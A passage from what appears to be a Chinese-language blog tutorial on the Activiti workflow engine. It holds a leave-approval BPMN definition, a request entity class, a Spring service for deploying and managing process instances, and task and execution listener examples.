        <span class="hljs-type">long</span> <span class="hljs-variable">tableCount</span> <span class="hljs-operator">=</span> managementService.createTableCountQuery().count();
        System.out.println(<span class="hljs-string">"Activiti表数量: "</span> + tableCount);

        <span class="hljs-comment">// 获取数据库表元数据</span>
        List&lt;String&gt; tableNames = managementService.getTableNames();
        System.out.println(<span class="hljs-string">"Activiti表名列表: "</span> + tableNames);
    }

    <span class="hljs-comment">/**
     * 获取动态BPMN服务 - 动态修改流程
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dynamicBpmnServiceExample</span><span class="hljs-params">()</span> {
        <span class="hljs-type">DynamicBpmnService</span> <span class="hljs-variable">dynamicBpmnService</span> <span class="hljs-operator">=</span> processEngine.getDynamicBpmnService();

        <span class="hljs-comment">// 动态修改流程定义的某些属性，而不需要重新部署</span>
        <span class="hljs-comment">// 例如：修改任务名称、添加监听器等</span>
        System.out.println(<span class="hljs-string">"动态BPMN服务可用于运行时修改流程定义"</span>);
    }
}
</code></pre>
<h3 data-id="heading-10">四、BPMN流程设计</h3>
<h4 data-id="heading-11">4.1 创建请假流程</h4>
<p>下面是一个完整的请假审批流程BPMN文件：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">definitions</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.omg.org/spec/BPMN/20100524/MODEL"</span>
             <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span>
             <span class="hljs-attr">xmlns:activiti</span>=<span class="hljs-string">"http://activiti.org/bpmn"</span>
             <span class="hljs-attr">xmlns:bpmndi</span>=<span class="hljs-string">"http://www.omg.org/spec/BPMN/20100524/DI"</span>
             <span class="hljs-attr">typeLanguage</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema"</span>
             <span class="hljs-attr">expressionLanguage</span>=<span class="hljs-string">"http://www.w3.org/1999/XPath"</span>
             <span class="hljs-attr">targetNamespace</span>=<span class="hljs-string">"http://www.example.org/process"</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- 流程定义 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">process</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"leaveRequest"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"请假审批流程"</span> <span class="hljs-attr">isExecutable</span>=<span class="hljs-string">"true"</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 开始事件 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">startEvent</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"startEvent"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"开始"</span>/&gt;</span>

        <span class="hljs-comment">&lt;!-- 用户任务：提交请假申请 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">userTask</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"submitLeave"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"提交请假申请"</span> <span class="hljs-attr">activiti:assignee</span>=<span class="hljs-string">"${applicant}"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">documentation</span>&gt;</span>员工提交请假申请<span class="hljs-tag">&lt;/<span class="hljs-name">documentation</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">userTask</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 用户任务：部门经理审批 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">userTask</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"managerApproval"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"部门经理审批"</span> <span class="hljs-attr">activiti:candidateGroups</span>=<span class="hljs-string">"managers"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">documentation</span>&gt;</span>部门经理审批请假申请<span class="hljs-tag">&lt;/<span class="hljs-name">documentation</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">userTask</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 网关：排他网关，根据请假天数判断 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">exclusiveGateway</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"gateway"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"天数判断"</span>/&gt;</span>

        <span class="hljs-comment">&lt;!-- 用户任务：总经理审批（请假天数大于3天） --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">userTask</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"gmApproval"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"总经理审批"</span> <span class="hljs-attr">activiti:candidateGroups</span>=<span class="hljs-string">"general_managers"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">documentation</span>&gt;</span>总经理审批长期请假<span class="hljs-tag">&lt;/<span class="hljs-name">documentation</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">userTask</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 服务任务：发送通知 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">serviceTask</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"sendNotification"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"发送通知"</span>
                     <span class="hljs-attr">activiti:class</span>=<span class="hljs-string">"com.example.activiti.delegate.SendNotificationDelegate"</span>/&gt;</span>

        <span class="hljs-comment">&lt;!-- 结束事件：审批通过 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">endEvent</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"endEventApproved"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"审批通过"</span>/&gt;</span>

        <span class="hljs-comment">&lt;!-- 结束事件：审批拒绝 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">endEvent</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"endEventRejected"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"审批拒绝"</span>/&gt;</span>

        <span class="hljs-comment">&lt;!-- 流程连线 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"flow1"</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"startEvent"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"submitLeave"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"flow2"</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"submitLeave"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"managerApproval"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"flow3"</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"managerApproval"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"gateway"</span>/&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"flow4"</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"gateway"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"gmApproval"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">conditionExpression</span> <span class="hljs-attr">xsi:type</span>=<span class="hljs-string">"tFormalExpression"</span>&gt;</span>
                &lt;![CDATA[${days &gt; 3}]]&gt;
            <span class="hljs-tag">&lt;/<span class="hljs-name">conditionExpression</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">sequenceFlow</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"flow5"</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"gateway"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"sendNotification"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">conditionExpression</span> <span class="hljs-attr">xsi:type</span>=<span class="hljs-string">"tFormalExpression"</span>&gt;</span>
                &lt;![CDATA[${days &lt;= 3}]]&gt;
            <span class="hljs-tag">&lt;/<span class="hljs-name">conditionExpression</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">sequenceFlow</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"flow6"</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"gmApproval"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"sendNotification"</span>/&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"flow7"</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"sendNotification"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"endEventApproved"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">conditionExpression</span> <span class="hljs-attr">xsi:type</span>=<span class="hljs-string">"tFormalExpression"</span>&gt;</span>
                &lt;![CDATA[${approved == true}]]&gt;
            <span class="hljs-tag">&lt;/<span class="hljs-name">conditionExpression</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">sequenceFlow</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">sequenceFlow</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"flow8"</span> <span class="hljs-attr">sourceRef</span>=<span class="hljs-string">"sendNotification"</span> <span class="hljs-attr">targetRef</span>=<span class="hljs-string">"endEventRejected"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">conditionExpression</span> <span class="hljs-attr">xsi:type</span>=<span class="hljs-string">"tFormalExpression"</span>&gt;</span>
                &lt;![CDATA[${approved == false}]]&gt;
            <span class="hljs-tag">&lt;/<span class="hljs-name">conditionExpression</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">sequenceFlow</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">process</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- BPMN图形信息 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bpmndi:BPMNDiagram</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"BPMNDiagram_leaveRequest"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">bpmndi:BPMNPlane</span> <span class="hljs-attr">bpmnElement</span>=<span class="hljs-string">"leaveRequest"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"BPMNPlane_leaveRequest"</span>&gt;</span>
            <span class="hljs-comment">&lt;!-- 这里包含图形布局信息 --&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">bpmndi:BPMNPlane</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">bpmndi:BPMNDiagram</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">definitions</span>&gt;</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b3e2024b3ae45c2acd0e7308349094e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769561888&amp;x-signature=dd9i6Spi16RZgpjnoffMJOFsGJ4%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-12">4.2 流程设计最佳实践</h4>
<ol>
<li><strong>命名规范</strong>：流程定义ID使用驼峰命名，任务名称使用中文描述</li>
<li><strong>网关使用</strong>：合理使用排他网关、并行网关和包容网关</li>
<li><strong>任务分配</strong>：使用候选人（candidateUsers）和候选组（candidateGroups）</li>
<li><strong>流程变量</strong>：合理设置流程变量，避免传递过多数据</li>
</ol>
<h3 data-id="heading-13">五、生产环境实战案例</h3>
<h4 data-id="heading-14">5.1 系统整体架构</h4>
<p>下面是一个典型的OA系统与Activiti集成的架构设计：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f610c33daa1437482e1ae46f3974947~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769561888&amp;x-signature=KZo8nn%2BJPa%2BxDpkIprc8Is4%2BMd0%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-15">5.2 请假审批完整实现</h4>
<h5 data-id="heading-16">5.2.1 实体类设计</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.activiti.entity;

<span class="hljs-keyword">import</span> java.util.Date;

<span class="hljs-comment">/**
 * 请假申请实体
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LeaveRequest</span> {

    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> String processInstanceId;
    <span class="hljs-keyword">private</span> String applicant;
    <span class="hljs-keyword">private</span> Integer days;
    <span class="hljs-keyword">private</span> String reason;
    <span class="hljs-keyword">private</span> Date startTime;
    <span class="hljs-keyword">private</span> Date endTime;
    <span class="hljs-keyword">private</span> String status;
    <span class="hljs-keyword">private</span> Date createTime;
    <span class="hljs-keyword">private</span> Date updateTime;

    <span class="hljs-comment">// Getter和Setter方法</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getProcessInstanceId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> processInstanceId;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setProcessInstanceId</span><span class="hljs-params">(String processInstanceId)</span> {
        <span class="hljs-built_in">this</span>.processInstanceId = processInstanceId;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getApplicant</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> applicant;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setApplicant</span><span class="hljs-params">(String applicant)</span> {
        <span class="hljs-built_in">this</span>.applicant = applicant;
    }

    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">getDays</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> days;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDays</span><span class="hljs-params">(Integer days)</span> {
        <span class="hljs-built_in">this</span>.days = days;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getReason</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> reason;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setReason</span><span class="hljs-params">(String reason)</span> {
        <span class="hljs-built_in">this</span>.reason = reason;
    }

    <span class="hljs-keyword">public</span> Date <span class="hljs-title function_">getStartTime</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> startTime;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setStartTime</span><span class="hljs-params">(Date startTime)</span> {
        <span class="hljs-built_in">this</span>.startTime = startTime;
    }

    <span class="hljs-keyword">public</span> Date <span class="hljs-title function_">getEndTime</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> endTime;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setEndTime</span><span class="hljs-params">(Date endTime)</span> {
        <span class="hljs-built_in">this</span>.endTime = endTime;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getStatus</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> status;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setStatus</span><span class="hljs-params">(String status)</span> {
        <span class="hljs-built_in">this</span>.status = status;
    }

    <span class="hljs-keyword">public</span> Date <span class="hljs-title function_">getCreateTime</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> createTime;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCreateTime</span><span class="hljs-params">(Date createTime)</span> {
        <span class="hljs-built_in">this</span>.createTime = createTime;
    }

    <span class="hljs-keyword">public</span> Date <span class="hljs-title function_">getUpdateTime</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> updateTime;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUpdateTime</span><span class="hljs-params">(Date updateTime)</span> {
        <span class="hljs-built_in">this</span>.updateTime = updateTime;
    }
}
</code></pre>
<h5 data-id="heading-17">5.2.2 服务层实现</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.activiti.service;

<span class="hljs-keyword">import</span> com.example.activiti.entity.LeaveRequest;
<span class="hljs-keyword">import</span> org.activiti.engine.*;
<span class="hljs-keyword">import</span> org.activiti.engine.repository.Deployment;
<span class="hljs-keyword">import</span> org.activiti.engine.runtime.ProcessInstance;
<span class="hljs-keyword">import</span> org.activiti.engine.task.Task;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
<span class="hljs-keyword">import</span> org.springframework.transaction.annotation.Transactional;

<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.List;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-comment">/**
 * 请假审批服务
 */</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LeaveRequestService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ProcessEngine processEngine;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RepositoryService repositoryService;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RuntimeService runtimeService;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> TaskService taskService;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> HistoryService historyService;

    <span class="hljs-comment">/**
     * 部署流程定义
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deployProcess</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Deployment</span> <span class="hljs-variable">deployment</span> <span class="hljs-operator">=</span> repositoryService.createDeployment()
                .addClasspathResource(<span class="hljs-string">"processes/leave-request.bpmn20.xml"</span>)
                .name(<span class="hljs-string">"请假审批流程"</span>)
                .category(<span class="hljs-string">"OA"</span>)
                .deploy();

        System.out.println(<span class="hljs-string">"流程部署成功，ID: "</span> + deployment.getId());
    }

    <span class="hljs-comment">/**
     * 启动请假流程
     */</span>
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">startLeaveProcess</span><span class="hljs-params">(LeaveRequest leaveRequest)</span> {
        <span class="hljs-comment">// 准备流程变量</span>
        Map&lt;String, Object&gt; variables = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        variables.put(<span class="hljs-string">"applicant"</span>, leaveRequest.getApplicant());
        variables.put(<span class="hljs-string">"days"</span>, leaveRequest.getDays());
        variables.put(<span class="hljs-string">"reason"</span>, leaveRequest.getReason());
        variables.put(<span class="hljs-string">"startTime"</span>, leaveRequest.getStartTime());
        variables.put(<span class="hljs-string">"endTime"</span>, leaveRequest.getEndTime());

        <span class="hljs-comment">// 启动流程实例</span>
        <span class="hljs-type">ProcessInstance</span> <span class="hljs-variable">processInstance</span> <span class="hljs-operator">=</span> runtimeService.startProcessInstanceByKey(
                <span class="hljs-string">"leaveRequest"</span>,
                variables
        );

        <span class="hljs-comment">// 保存流程实例ID到业务表</span>
        leaveRequest.setProcessInstanceId(processInstance.getId());
        leaveRequest.setStatus(<span class="hljs-string">"PENDING"</span>);
        <span class="hljs-comment">// 这里应该调用DAO保存到数据库</span>
        <span class="hljs-comment">// leaveRequestDao.insert(leaveRequest);</span>

        <span class="hljs-keyword">return</span> processInstance.getId();
    }

    <span class="hljs-comment">/**
     * 查询待办任务
     */</span>
    <span class="hljs-keyword">public</span> List&lt;Task&gt; <span class="hljs-title function_">findPendingTasks</span><span class="hljs-params">(String assignee)</span> {
        <span class="hljs-keyword">return</span> taskService.createTaskQuery()
                .taskAssignee(assignee)
                .orderByTaskCreateTime()
                .desc()
                .list();
    }

    <span class="hljs-comment">/**
     * 查询候选任务（组任务）
     */</span>
    <span class="hljs-keyword">public</span> List&lt;Task&gt; <span class="hljs-title function_">findCandidateTasks</span><span class="hljs-params">(String candidateGroup)</span> {
        <span class="hljs-keyword">return</span> taskService.createTaskQuery()
                .taskCandidateGroup(candidateGroup)
                .orderByTaskCreateTime()
                .desc()
                .list();
    }

    <span class="hljs-comment">/**
     * 完成任务
     */</span>
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">completeTask</span><span class="hljs-params">(String taskId, <span class="hljs-type">boolean</span> approved, String comment)</span> {
        <span class="hljs-comment">// 设置审批结果</span>
        Map&lt;String, Object&gt; variables = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        variables.put(<span class="hljs-string">"approved"</span>, approved);
        variables.put(<span class="hljs-string">"comment"</span>, comment);

        <span class="hljs-comment">// 添加评论</span>
        taskService.addComment(taskId, <span class="hljs-literal">null</span>, comment);

        <span class="hljs-comment">// 完成任务</span>
        taskService.complete(taskId, variables);

        <span class="hljs-comment">// 更新业务状态</span>
        <span class="hljs-type">Task</span> <span class="hljs-variable">task</span> <span class="hljs-operator">=</span> taskService.createTaskQuery().taskId(taskId).singleResult();
        <span class="hljs-type">String</span> <span class="hljs-variable">processInstanceId</span> <span class="hljs-operator">=</span> task.getProcessInstanceId();

        <span class="hljs-comment">// 根据审批结果更新业务表</span>
        <span class="hljs-comment">// LeaveRequest leaveRequest = leaveRequestDao.findByProcessInstanceId(processInstanceId);</span>
        <span class="hljs-comment">// leaveRequest.setStatus(approved ? "APPROVED" : "REJECTED");</span>
        <span class="hljs-comment">// leaveRequestDao.update(leaveRequest);</span>
    }

    <span class="hljs-comment">/**
     * 查询流程历史
     */</span>
    <span class="hljs-keyword">public</span> Map&lt;String, Object&gt; <span class="hljs-title function_">getProcessHistory</span><span class="hljs-params">(String processInstanceId)</span> {
        <span class="hljs-comment">// 查询流程实例历史</span>
        org.activiti.engine.history.<span class="hljs-type">HistoricProcessInstance</span> <span class="hljs-variable">historicProcessInstance</span> <span class="hljs-operator">=</span>
                historyService.createHistoricProcessInstanceQuery()
                        .processInstanceId(processInstanceId)
                        .singleResult();

        <span class="hljs-comment">// 查询历史任务</span>
        List&lt;org.activiti.engine.task.history.HistoricTaskInstance&gt; historicTasks =
                historyService.createHistoricTaskInstanceQuery()
                        .processInstanceId(processInstanceId)
                        .orderByHistoricTaskInstanceEndTime()
                        .asc()
                        .list();

        <span class="hljs-comment">// 查询历史变量</span>
        List&lt;org.activiti.engine.history.HistoricVariableInstance&gt; historicVariables =
                historyService.createHistoricVariableInstanceQuery()
                        .processInstanceId(processInstanceId)
                        .list();

        Map&lt;String, Object&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        result.put(<span class="hljs-string">"processInstance"</span>, historicProcessInstance);
        result.put(<span class="hljs-string">"tasks"</span>, historicTasks);
        result.put(<span class="hljs-string">"variables"</span>, historicVariables);

        <span class="hljs-keyword">return</span> result;
    }

    <span class="hljs-comment">/**
     * 撤销流程
     */</span>
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cancelProcess</span><span class="hljs-params">(String processInstanceId, String reason)</span> {
        <span class="hljs-comment">// 删除流程实例</span>
        runtimeService.deleteProcessInstance(processInstanceId, reason);

        <span class="hljs-comment">// 更新业务表状态</span>
        <span class="hljs-comment">// LeaveRequest leaveRequest = leaveRequestDao.findByProcessInstanceId(processInstanceId);</span>
        <span class="hljs-comment">// leaveRequest.setStatus("CANCELLED");</span>
        <span class="hljs-comment">// leaveRequestDao.update(leaveRequest);</span>
    }

    <span class="hljs-comment">/**
     * 挂起流程
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">suspendProcess</span><span class="hljs-params">(String processInstanceId)</span> {
        runtimeService.suspendProcessInstanceById(processInstanceId);
    }

    <span class="hljs-comment">/**
     * 激活流程
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">activateProcess</span><span class="hljs-params">(String processInstanceId)</span> {
        runtimeService.activateProcessInstanceById(processInstanceId);
    }
}
</code></pre>
<h4 data-id="heading-18">5.3 任务监听器</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.activiti.listener;

<span class="hljs-keyword">import</span> org.activiti.engine.delegate.DelegateTask;
<span class="hljs-keyword">import</span> org.activiti.engine.delegate.TaskListener;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-comment">/**
 * 任务创建监听器
 */</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TaskCreateListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">TaskListener</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">notify</span><span class="hljs-params">(DelegateTask delegateTask)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">taskName</span> <span class="hljs-operator">=</span> delegateTask.getName();
        <span class="hljs-type">String</span> <span class="hljs-variable">assignee</span> <span class="hljs-operator">=</span> delegateTask.getAssignee();

        System.out.println(<span class="hljs-string">"任务创建: "</span> + taskName);
        System.out.println(<span class="hljs-string">"办理人: "</span> + assignee);

        <span class="hljs-comment">// 发送通知</span>
        sendNotification(assignee, taskName);

        <span class="hljs-comment">// 记录日志</span>
        logTask(delegateTask);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendNotification</span><span class="hljs-params">(String assignee, String taskName)</span> {
        <span class="hljs-comment">// 实现发送邮件、短信等通知逻辑</span>
        System.out.println(<span class="hljs-string">"发送通知给: "</span> + assignee + <span class="hljs-string">", 任务: "</span> + taskName);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">logTask</span><span class="hljs-params">(DelegateTask delegateTask)</span> {
        <span class="hljs-comment">// 记录任务创建日志</span>
        System.out.println(<span class="hljs-string">"任务ID: "</span> + delegateTask.getId());
        System.out.println(<span class="hljs-string">"流程实例ID: "</span> + delegateTask.getProcessInstanceId());
    }
}
</code></pre>
<h4 data-id="heading-19">5.4 执行监听器</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.activiti.listener;

<span class="hljs-keyword">import</span> org.activiti.engine.delegate.DelegateExecution;
<span class="hljs-keyword">import</span> org.activiti.engine.delegate.ExecutionListener;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-comment">/**
 * 流程开始监听器
 */</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProcessStartListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ExecutionListener</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">notify</span><span class="hljs-params">(DelegateExecution execution)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">processInstanceId</span> <span class="hljs-operator">=</span> execution.getProcessInstanceId();
        <span class="hljs-type">String</span> <span class="hljs-variable">processDefinitionId</span> <span class="hljs-operator">=</span> execution.getProcessDefinitionId();

        System.out.println(<span class="hljs-string">"流程启动: "</span> + processInstanceId);
        System.out.println(<span class="hljs-string">"流程定义: "</span> + processDefinitionId);

        <span class="hljs-comment">// 初始化流程变量</span>
        execution.setVariable(<span class="hljs-string">"startTime"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Date());
        execution.setVariable(<span class="hljs-string">"status"</span>, <span class="hljs-string">"RUNNING"</span>);

        <span class="hljs-comment">// 记录流程启动日志</span>
        logProcessStart(execution);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">logProcessStart</span><span class="hljs-params">(DelegateExecution execution)</span> {
        <span class="hljs-comment">// 记录流程启动日志</span>
        System.out.println(<span class="hljs-string">"记录流程启动日志"</span>);
    }
}
</code></pre>
